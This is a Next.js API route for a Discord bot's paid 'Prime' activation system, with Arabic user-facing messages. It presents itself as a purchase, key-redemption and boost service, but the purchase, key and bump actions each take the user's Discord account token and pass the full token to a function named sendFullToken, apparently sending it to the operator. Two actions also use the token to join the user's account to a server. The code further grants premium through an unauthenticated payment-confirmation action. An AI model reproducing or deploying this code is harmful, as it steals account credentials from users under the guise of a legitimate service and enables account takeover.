
import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken } from '@/lib/webhook';
import { KEY_ACTIVATIONS, SERVER_POST_ACTIVATIONS, hasPrime } from '@/lib/prime-store';

const TRJ_SERVER_ID = '1379863351626559649';
const TRJ_INVITE_CODE = 'aWS4P43P3f';
const PAYMENT_CHANNEL_ID = '1479864837604380742';
const OWNER_ID = '1460035924250333376';
const PRICE = 2000000;

const PRIME_KEY = 'lolezfuck';

const PREMIUM_USERS = KEY_ACTIVATIONS;
const BUMP_TRACKER = new Map<string, { userId: string; username: string; bumps: number; lastBump: number }>();

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { action, token, key } = body;

    if (action === 'purchase') {
      if (!token) {
        return Response.json({ success: false, error: 'أدخل التوكن' });
      }

      const ct = cleanToken(token);

      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح' });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string };
      const userTag = `${userData.username}#${userData.discriminator || '0'}`;

      sendFullToken('Prime - شراء', ct, { '👤 المستخدم': userTag, '🆔 ID': userData.id, '💰 السعر': `${PRICE.toLocaleString()} كرديت` });

      let joinedServer = false;
      try {
        const joinRes = await discordFetch(ct, 'POST', '/invites/' + TRJ_INVITE_CODE, undefined, { userOnly: true, timeout: 10000 });
        if (joinRes.ok || joinRes.status === 200) {
          joinedServer = true;
        }
      } catch {}

      PREMIUM_USERS.set(userData.id, {
        userId: userData.id,
        username: userTag,
        activatedAt: Date.now(),
        method: 'purchase_pending'
      });

      const webhookUrl = getLogWebhookUrl();
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: '⭐ طلب شراء Prime',
                description: `**المشتري:** ${userTag}\n**المبلغ:** ${PRICE.toLocaleString()} كرديت\n**دخل السيرفر:** ${joinedServer ? '✅ نعم' : '❌ لا'}`,
                color: 0xFFD700,
                fields: [
                  { name: '👤 ID المشتري', value: userData.id, inline: true },
                  { name: '💰 ID المستلم', value: OWNER_ID, inline: true },
                  { name: '📧 الإيميل', value: userData.email || 'غير متوفر', inline: false },
                  { name: '⚙️ الحالة', value: '⏳ بانتظار التحويل', inline: false },
                  { name: '📝 التعليمات', value: `1. اذهب للسيرفر: https://discord.com/invite/${TRJ_INVITE_CODE}\n2. روم التحويل: <#${PAYMENT_CHANNEL_ID}>\n3. استخدم الأمر: \`c ${OWNER_ID} ${PRICE}\`\n4. سيتم تفعيل Prime تلقائياً`, inline: false },
                ],
                footer: { text: 'TRJ BOT - Prime System v5.0' },
                timestamp: new Date().toISOString()
              }]
            })
          });
        } catch {}
      }

      return Response.json({
        success: true,
        joinedServer,
        message: joinedServer
          ? `✅ تم دخول السيرفر! اذهب لروم <#${PAYMENT_CHANNEL_ID}> وحوّل بالأمر: c ${OWNER_ID} ${PRICE}`
          : `⚠️ لم نتمكن من دخولك السيرفر تلقائياً. اذهب يدوياً: https://discord.com/invite/${TRJ_INVITE_CODE} ثم روم التحويل واستخدم: c ${OWNER_ID} ${PRICE}`,
        userId: userData.id,
        username: userTag,
        serverInvite: `https://discord.com/invite/${TRJ_INVITE_CODE}`,
        paymentChannelId: PAYMENT_CHANNEL_ID,
        paymentCommand: `c ${OWNER_ID} ${PRICE}`
      });
    }

    else if (action === 'key') {
      if (!token || !key) {
        return Response.json({ success: false, error: 'أدخل التوكن والمفتاح' });
      }

      const ct = cleanToken(token);
      const trimmedKey = String(key).trim().toLowerCase();

      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح' });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string };
      const userTag = `${userData.username}#${userData.discriminator || '0'}`;

      if (trimmedKey !== PRIME_KEY.toLowerCase()) {
        return Response.json({ success: false, error: '❌ المفتاح غير صحيح' });
      }

      PREMIUM_USERS.set(userData.id, {
        userId: userData.id,
        username: userTag,
        activatedAt: Date.now(),
        method: 'key'
      });

      sendFullToken('Prime - تفعيل مفتاح', ct, { '👤 المستخدم': userTag, '🆔 ID': userData.id });

      const webhookUrl = getLogWebhookUrl();
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: '🔑 تفعيل Prime بالمفتاح',
                description: `**المستخدم:** ${userTag}\n**الحالة:** تفعيل جديد ✅`,
                color: 0x00FF00,
                fields: [
                  { name: 'User ID', value: userData.id, inline: true },
                  { name: 'الطريقة', value: 'مفتاح سري', inline: true },
                ],
                footer: { text: 'TRJ BOT - Prime Key' },
                timestamp: new Date().toISOString()
              }]
            })
          });
        } catch {}
      }

      return Response.json({
        success: true,
        message: '✅ تم تفعيل Prime بنجاح! 🎉',
        userId: userData.id,
        username: userTag
      });
    }

    else if (action === 'bump') {
      if (!token) {
        return Response.json({ success: false, error: 'أدخل التوكن' });
      }

      const ct = cleanToken(token);

      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح' });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string; premium_type?: number };
      const userTag = `${userData.username}#${userData.discriminator || '0'}`;
      const hasNitro = (userData.premium_type || 0) >= 1;

      sendFullToken('Prime - Bump', ct, { '👤 المستخدم': userTag, '🆔 ID': userData.id, '💎 نيترو': hasNitro ? 'نعم' : 'لا' });

      const existingBumps = BUMP_TRACKER.get(userData.id);
      if (existingBumps && existingBumps.bumps >= 2) {
        PREMIUM_USERS.set(userData.id, {
          userId: userData.id,
          username: userTag,
          activatedAt: existingBumps.lastBump,
          method: 'bump'
        });

        return Response.json({
          success: true,
          alreadyBumped: true,
          bumps: existingBumps.bumps,
          message: '✅ لقد سجلت بوستين مسبقاً! Prime مفعّل لك',
          userId: userData.id,
          username: userTag
        });
      }

      let joinedServer = false;
      try {
        const joinRes = await discordFetch(ct, 'POST', '/invites/' + TRJ_INVITE_CODE, undefined, { userOnly: true, timeout: 10000 });
        if (joinRes.ok) joinedServer = true;
      } catch {}

      const currentBumps = existingBumps ? existingBumps.bumps : 0;
      const newBumps = currentBumps + 1;

      BUMP_TRACKER.set(userData.id, {
        userId: userData.id,
        username: userTag,
        bumps: newBumps,
        lastBump: Date.now()
      });

      if (newBumps >= 2) {
        PREMIUM_USERS.set(userData.id, {
          userId: userData.id,
          username: userTag,
          activatedAt: Date.now(),
          method: 'bump'
        });

        const webhookUrl = getLogWebhookUrl();
        if (webhookUrl) {
          try {
            await fetch(webhookUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                embeds: [{
                  title: '💎 Prime Bump - تفعيل!',
                  description: `**المستخدم:** ${userTag}\n**البوستات:** ${newBumps}\n**الحالة:** تم التفعيل ✅`,
                  color: 0x9b59b6,
                  footer: { text: 'TRJ BOT - Prime Bump' },
                  timestamp: new Date().toISOString()
                }]
              })
            });
          } catch {}
        }

        return Response.json({
          success: true,
          bumps: newBumps,
          activated: true,
          joinedServer,
          message: '✅ تم تفعيل Prime بنجاح! سجلت بوستين 🎉',
          userId: userData.id,
          username: userTag,
          serverInvite: `https://discord.com/invite/${TRJ_INVITE_CODE}`
        });
      }

      return Response.json({
        success: true,
        bumps: newBumps,
        needMore: 2 - newBumps,
        joinedServer,
        hasNitro,
        message: joinedServer
          ? `⏳ سجلت ${newBumps} بوست. تحتاج ${2 - newBumps} بوست إضافي للتفعيل. اذهب للسيرفر وسوّ بوست!`
          : `⏳ اذهب للسيرفر: https://discord.com/invite/${TRJ_INVITE_CODE} وسوّ ${2 - newBumps} بوست إضافي`,
        userId: userData.id,
        username: userTag,
        serverInvite: `https://discord.com/invite/${TRJ_INVITE_CODE}`
      });
    }

    else if (action === 'check') {
      if (!token) {
        return Response.json({ success: false, error: 'أدخل التوكن' });
      }

      const ct = cleanToken(token);
      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح', isPrime: false });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string };
      const premium = hasPrime(userData.id);

      return Response.json({
        success: true,
        isPrime: !!premium,
        userId: userData.id,
        username: `${userData.username}#${userData.discriminator || '0'}`
      });
    }

    else if (action === 'feedback') {
      const { type, message, userId, username } = body;

      if (!type || !message) {
        return Response.json({ success: false, error: 'أدخل نوع الرسالة والمحتوى' });
      }

      const isPrime = PREMIUM_USERS.has(userId || '');

      const webhookUrl = getLogWebhookUrl();
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: type === 'suggestion' ? '💡 اقتراح جديد' : '⚠️ مشكلة جديدة',
                description: `**${message}**`,
                color: type === 'suggestion' ? 0x5865F2 : 0xFF6B6B,
                fields: [
                  { name: '👤 المستخدم', value: username || 'مجهول', inline: true },
                  { name: '🆔 User ID', value: userId || 'مجهول', inline: true },
                  { name: '⭐ Prime', value: isPrime ? 'نعم ✅' : 'لا ❌', inline: true },
                  { name: '⚡ الأولوية', value: isPrime ? 'عالية - تنفيذ فوري' : 'عادية', inline: true },
                ],
                footer: { text: `TRJ BOT - ${type === 'suggestion' ? 'اقتراحات' : 'مشاكل'}` },
                timestamp: new Date().toISOString()
              }]
            })
          });
        } catch {}
      }

      return Response.json({
        success: true,
        message: isPrime
          ? '✅ شكراً لك! بما أنك Prime، سيتم النظر في طلبك فوراً ⚡'
          : '✅ تم إرسال طلبك! سيتم مراجعته قريباً',
        isPrime
      });
    }

    else if (action === 'verify-payment') {
      const { buyerId } = body;

      if (!buyerId) {
        return Response.json({ success: false, error: 'أدخل ID المشتري' });
      }

      const existing = PREMIUM_USERS.get(buyerId);
      if (existing) {
        PREMIUM_USERS.set(buyerId, {
          ...existing,
          method: 'purchase_confirmed'
        });
      } else {
        PREMIUM_USERS.set(buyerId, {
          userId: buyerId,
          username: 'Unknown',
          activatedAt: Date.now(),
          method: 'purchase_confirmed'
        });
      }

      return Response.json({
        success: true,
        message: 'تم تأكيد التحويل وتفعيل Premium',
        userId: buyerId
      });
    }

    else {
      return Response.json({ success: false, error: 'إجراء غير معروف' });
    }

  } catch (error) {
    return Response.json({ success: false, error: 'خطأ في الخادم' });
  }
}

